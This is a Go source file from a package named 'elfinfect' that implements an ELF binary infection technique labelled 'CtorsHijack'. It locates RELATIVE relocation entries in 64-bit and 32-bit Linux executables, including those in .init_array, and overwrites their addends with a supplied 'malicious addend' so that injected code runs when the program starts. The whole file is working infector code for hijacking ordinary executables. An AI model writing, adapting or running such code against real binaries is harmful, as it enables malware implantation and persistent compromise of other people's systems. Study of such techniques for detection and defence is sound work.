package elfinfect

import (
	"bytes"
	"debug/elf"
	"encoding/binary"
	"errors"
	"fmt"
	"reflect"
)

func (t *TargetBin) relativeRelocHook(origAddend interface{}, relocEntry interface{}, newAddend interface{}) error {
	t.printDebugMsg("[+] CtorsHijack requested. Locating and reading Dynamic Segment")

	if err := t.GetDyn(); err != nil {
		return err
	}

	if _, ok := relocEntry.(*elf.Rela64); ok {
		pHeaders := t.Phdrs.([]elf.Prog64)

		t.printDebugMsg("[+] %d entries in Dynamic Segment\n", len(t.Dyn.([]elf.Dyn64)))

		var dtRelaOffset uint64
		var dtRelaEntryCount uint64

		for _, dynEntry := range t.Dyn.([]elf.Dyn64) {
			if elf.DynTag(dynEntry.Tag) == elf.DT_RELA {
				t.printDebugMsg("[+] Located DT_RELA @ 0x%016x\n", dynEntry.Val)
				dtRelaOffset = dynEntry.Val
			}

			if elf.DynTag(dynEntry.Tag) == elf.DT_RELAENT {
				t.printDebugMsg("[+] DT_RELA has %d entries\n", dynEntry.Val)
				dtRelaEntryCount = dynEntry.Val
			}
		}

		if dtRelaEntryCount == 0 || dtRelaOffset == 0 {
			return errors.New("Error while acquiring DT_RELA or DT_RELAENT")
		}

		var o uint64

		o = dtRelaOffset

		t.printDebugMsg("[+] File offset of relocations @ 0x%016x\n", o)

		relaEntrySize := uint64(reflect.TypeOf(*relocEntry.(*elf.Rela64)).Size())
		endReloc := o + dtRelaEntryCount*uint64(relaEntrySize)

		for s := relaEntrySize; o < endReloc; o += s {
			relReader := bytes.NewBuffer(t.Contents[o : o+s])
			if err := binary.Read(relReader, t.EIdent.Endianness, relocEntry); err != nil {
				return err
			}

			if elf.R_X86_64(relocEntry.(*elf.Rela64).Info) == elf.R_X86_64_RELATIVE {
				if t.hasTLS {
					if t.withInSectionVirtualAddrSpace(".init_array", relocEntry.(*elf.Rela64).Off) {
						break
					}
					continue
				}
				break
			}
		}

		t.printDebugMsg("[+] Found viable relocation record hooking/poisoning")
		t.printDebugMsg("\toffset: 0x%016x\n", relocEntry.(*elf.Rela64).Off)
		t.printDebugMsg("\ttype: %s\n", elf.R_X86_64(relocEntry.(*elf.Rela64).Info).String())
		t.printDebugMsg("\tAddend: 0x%016x\n", relocEntry.(*elf.Rela64).Addend)

		if elf.R_X86_64(relocEntry.(*elf.Rela64).Info) != elf.R_X86_64_RELATIVE {
			return errors.New("No R_X86_64_RELATIVE relocation type present for this technique.")
		}

		*origAddend.(*int64) = relocEntry.(*elf.Rela64).Addend
		relocEntry.(*elf.Rela64).Addend = newAddend.(int64)

		relWriter := new(bytes.Buffer)
		if err := binary.Write(relWriter, t.EIdent.Endianness, relocEntry); err != nil {
			return err
		}

		copy(t.Contents[o:], relWriter.Bytes())

		var fileOff uint64
		if err := getFileOffset(relocEntry.(*elf.Rela64).Off, pHeaders, &fileOff); err != nil {
			fmt.Println(err)

		}

		binary.LittleEndian.PutUint64(t.Contents[fileOff:], uint64(relocEntry.(*elf.Rela64).Addend))

		t.printDebugMsg("[+] offset 0x%016x updated with value (Addend) %016x\n", fileOff, relocEntry.(*elf.Rela64).Addend)
	}

	if _, ok := relocEntry.(*elf.Rel32); ok {
		pHeaders := t.Phdrs.([]elf.Prog32)

		t.printDebugMsg("[+] %d entries in Dynamic Segment\n", len(t.Dyn.([]elf.Dyn32)))

		var dtRelOffset uint32
		var dtRelEntryCount uint32

		for _, dynEntry := range t.Dyn.([]elf.Dyn32) {
			if elf.DynTag(dynEntry.Tag) == elf.DT_REL {
				t.printDebugMsg("[+] Located DT_REL @ 0x%08x\n", dynEntry.Val)
				dtRelOffset = dynEntry.Val
			}

			if elf.DynTag(dynEntry.Tag) == elf.DT_RELENT {
				t.printDebugMsg("[+] DT_REL has %d entries\n", dynEntry.Val)
				dtRelEntryCount = dynEntry.Val
			}
		}

		if dtRelEntryCount == 0 || dtRelOffset == 0 {
			return errors.New("Error while acquiring DT_RELA or DT_RELAENT")
		}

		var o uint32

		o = dtRelOffset

		t.printDebugMsg("[+] File offset of relocations @ 0x%08x\n", o)

		relEntrySize := uint32(reflect.TypeOf(*relocEntry.(*elf.Rel32)).Size())
		endReloc := o + dtRelEntryCount*uint32(relEntrySize)

		for s := relEntrySize; o < endReloc; o += s {
			relReader := bytes.NewBuffer(t.Contents[o : o+s])
			if err := binary.Read(relReader, t.EIdent.Endianness, relocEntry); err != nil {
				return err
			}

			if elf.R_386(relocEntry.(*elf.Rel32).Info) == elf.R_386_RELATIVE {
				if t.hasTLS {
					if t.withInSectionVirtualAddrSpace(".init_array", relocEntry.(*elf.Rel32).Off) {
						break
					}
					continue
				}
				break
			}
		}

		t.printDebugMsg("[+] Found viable relocation record hooking/poisoning")
		t.printDebugMsg("\toffset: 0x%016x\n", relocEntry.(*elf.Rel32).Off)
		t.printDebugMsg("\ttype: %s\n", elf.R_386(relocEntry.(*elf.Rel32).Info).String())

		if elf.R_386(relocEntry.(*elf.Rel32).Info) != elf.R_386_RELATIVE {
			return errors.New("No R_386_RELATIVE relocation type present for this technique.")
		}

		/* Logic here will differ for 32-bit Intel ELF bins.
		 * Where 64-bit Intel ELF bins will use Rela structures, which allow for explicit Addends,
		 * 32-bit Intel ELF bins will have their addend's at the offset in the the rel structure.
		 */

		var fileOff uint32
		if err := getFileOffset(relocEntry.(*elf.Rel32).Off, pHeaders, &fileOff); err != nil {
			fmt.Println(err)

		}

		ar := bytes.NewReader(t.Contents[fileOff : fileOff+4])
		if err := binary.Read(ar, t.EIdent.Endianness, origAddend.(*uint32)); err != nil {
			return err
		}

		malAddend := newAddend.(int32)
		malBytes := new(bytes.Buffer)

		if err := binary.Write(malBytes, t.EIdent.Endianness, &malAddend); err != nil {
			return err
		}

		copy(t.Contents[fileOff:], malBytes.Bytes())

		t.printDebugMsg("[+] offset 0x%08x updated with value (Addend) 0x%08x\n", fileOff, malAddend)
	}

	return nil
}

func (t *TargetBin) withInSectionVirtualAddrSpace(sectionName string, addr interface{}) bool {
	var s int
	for s = 0; s < len(t.SectionNames); s++ {
		if sectionName == t.SectionNames[s] {
			break
		}
	}

	var status bool
	if shdrs, ok := t.Shdrs.([]elf.Section64); ok {
		startAddr := shdrs[s].Addr
		endAddr := shdrs[s].Addr + shdrs[s].Size
		status = addr.(uint64) >= startAddr && addr.(uint64) <= endAddr
	}

	if shdrs, ok := t.Shdrs.([]elf.Section32); ok {
		startAddr := shdrs[s].Addr
		endAddr := shdrs[s].Addr + shdrs[s].Size
		status = addr.(uint32) >= startAddr && addr.(uint32) <= endAddr
	}

	return status
}
